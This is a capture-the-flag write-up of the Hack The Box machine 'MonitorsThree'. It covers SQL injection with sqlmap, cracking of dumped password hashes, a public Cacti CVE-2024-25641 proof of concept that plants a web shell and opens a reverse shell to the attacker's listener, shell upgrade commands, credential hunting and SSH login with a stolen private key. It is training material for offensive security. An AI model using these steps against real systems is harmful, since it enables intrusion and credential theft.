# MonitorsThree HTB - Medium

**Author:** Filippos Panagakos

## Enumeration

### Nmap Scan

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux;
protocol 2.0)
| ssh-hostkey:
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://monitorsthree.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster Vhost Scan

```
gobuster vhost -u http://monitorsthree.htb -w \
/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
--append-domain -xl 166
```

Found: `cacti.monitorsthree.htb` (Status: 302, redirects to `/cacti`)

Add to `/etc/hosts`:
```
cacti.monitorsthree.htb
```

The Cacti login page reveals version **1.2.26**.

### FeroxBuster Directory Scan

```
http://monitorsthree.htb/
http://monitorsthree.htb/admin/
http://monitorsthree.htb/admin/assets/
http://monitorsthree.htb/admin/assets/images/
http://monitorsthree.htb/admin/assets/css/
http://monitorsthree.htb/admin/assets/js/
http://monitorsthree.htb/admin/assets/swf/
http://monitorsthree.htb/css/
http://monitorsthree.htb/js/
http://monitorsthree.htb/images/
http://monitorsthree.htb/images/services/
http://monitorsthree.htb/images/blog/
http://monitorsthree.htb/fonts/
```

Noticed Cacti is a plugin, so I did a search and found this version is vulnerable to RCE. It allows authenticated users with the "Import Templates" permission to execute arbitrary PHP code on the web server. I need a valid user to perform this exploit.

## SQLi

The `/forgot_password.php` endpoint was vulnerable to SQL injection on the form. I launched sqlmap to enumerate the database. In this case I think we need to find credentials for a valid user to escalate to RCE.

```
Database: monitorsthree_db
Table: users
[4 entries]

| id | dob        | email                          | name              | salary    |
|    | password                          | username  | position             |
|    | start_date |
| 2  | 1978-04-25 | admin@monitorsthree.htb        | Marcus Higgins    | 320800.00 |
|    | 31a181c8372e3afc59dab863430610e8 | admin     | Super User           |
|    | 2021-01-12 |
| 5  | 1985-02-15 | mwatson@monitorsthree.htb      | Michael Watson    | 75000.00  |
|    | c585d01f2eb3e6e1073e92023088a3dd | mwatson   | Website Administrator|
|    | 2021-05-10 |
| 6  | 1990-07-30 | janderson@monitorsthree.htb    | Jennifer Anderson | 68000.00  |
|    | 1e68b6eb86b45f6d92f8f292428f77ac | janderson | Network Engineer     |
|    | 2021-06-20 |
| 7  | 1982-11-23 | dthompson@monitorsthree.htb    | David Thompson    |           |
|    | 83000.00 | 633b683cc128fe244b00f176c8a950f5 | dthompson | Database Manager     |
|    | 2022-09-15 |
```

Cracked the admin hash:
```
admin@monitorsthree.htb : greencacti2001
```

## Foothold

This version of Cacti (1.2.26) is vulnerable to **CVE-2024-25641** (Authenticated RCE). I used a PoC from SearchSploit that uploads a web shell and triggers a reverse shell.

```bash
searchsploit cacti 1.2.26
# Cacti 1.2.26 - Remote Code Execution (RCE) (Authenticated)

python3 52225.py --url http://cacti.monitorsthree.htb/cacti/ --user admin \
--password "greencacti2001" --lhost 10.10.14.100 --lport 1337 --verbose
```

```
CVE-2024-25641 - Cacti 1.2.26 Authenticated RCE

[*] Checking Cacti version...
[+] Version seems to be 1.2.26
[*] Capturing CSRF token...
[*] Logging in on http://cacti.monitorsthree.htb/cacti/index.php
[+] Successfully logged in as admin
[*] Generating malicious payload...
[*] Uploading GZIP file...
[+] Successfully uploaded GZIP file
[*] Validating success...
[+] Success!
[*] Triggering reverse shell by sending GET request to
http://cacti.monitorsthree.htb/cacti/resource/ifjasvympt.php
[+] Check your netcat listener
```

### Shell Upgrade

First check if python3 is installed, then upgrade to a PTY shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell with `Ctrl+Z`, then:

```bash
stty raw -echo; fg
export TERM=xterm
```

## Post-Exploitation Enumeration

We start enumerating the box. I used a credential hunting script ([NeCr00/Credential-Hunting](https://github.com/NeCr00/Credential-Hunting)) to find usable credentials.

### Credential Hunting Results

```
== Findings ==

Reusable credentials
  [HIGH] webapp/db_password  /var/www/html/cacti/include/config.php:33
         $database_password = 'cactiuser';
  [HIGH] webapp/db_password  /var/www/html/cacti/include/config.php:52
         #$rdatabase_password = 'cactiuser';

OS locations checked
  [CHECK] shadow  /etc/gshadow
  [CHECK] shadow  /etc/security/opasswd
  [CHECK] shadow  /etc/shadow
```

### Database Enumeration

Enumerated the database with the credentials found:

```bash
mysql -h localhost -u cactiuser -p  # cactiuser
```

```sql
show databases;
use cacti;
SELECT * FROM user_auth;
```

Found Cacti user hashes:

| id | username | password hash | realm | full_name | email |
|----|----------|--------------|-------|-----------|-------|
| 1  | admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G | 0 | Administrator | marcus@monitorsthree.htb |
| 3  | guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu | 0 | Guest Account | guest@monitorsthree.htb |
| 4  | marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK | 0 | Marcus | marcus@monitorsthree.htb |

### Cracking the Hash

Saved Marcus's bcrypt hash and cracked it with John:

```bash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

```
12345678910..christina
```

## User Flag

Navigating to Marcus's home directory, we can see there are `authorized_keys`. We grab his private key (`id_rsa`), copy the content, create a new file locally, and set the proper permissions:

```bash
nano id_rsa
chmod 600 id_rsa
ssh -i id_rsa marcus@monitorsthree.htb
```

We got the user shell. Now we can escalate our privileges, but I am mostly interested in the web part of this box since I am going for the CWES cert.
